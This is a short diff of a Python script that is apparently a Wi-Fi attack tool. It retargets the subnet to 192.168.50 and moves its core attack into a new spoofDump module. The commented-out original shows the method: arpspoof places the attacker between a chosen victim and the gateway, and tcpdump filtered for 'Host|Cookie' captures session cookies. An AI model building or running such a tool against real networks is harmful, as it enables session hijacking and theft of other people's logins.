@@ -1,7 +1,8 @@
 import os
 import ipscanner
+import spoofDump
 
-network_id = '192.168.0'
+network_id = '192.168.50'
 #network_id = '192.168.123'
 interface_name = 'wlan0'
 
@@ -36,7 +37,9 @@ if(inputnum != 1):
 	print("attack stopped")
 	exit()
 
-os.system("arpspoof -i "+interface_name+" -t "+selected[0]+' '+network_id+".1"+" & "\
-+'tcpdump -l -v -i '+interface_name+' | grep -E "Host|Cookie"')
+spoofDump.spoof_dump(interface_name, network_id, selected[0])
+
+#os.system("arpspoof -i "+interface_name+" -t "+selected[0]+' '+network_id+".1"+" & "\
+#+'tcpdump -l -v -i '+interface_name+' | grep -E "Host|Cookie"')
 
 
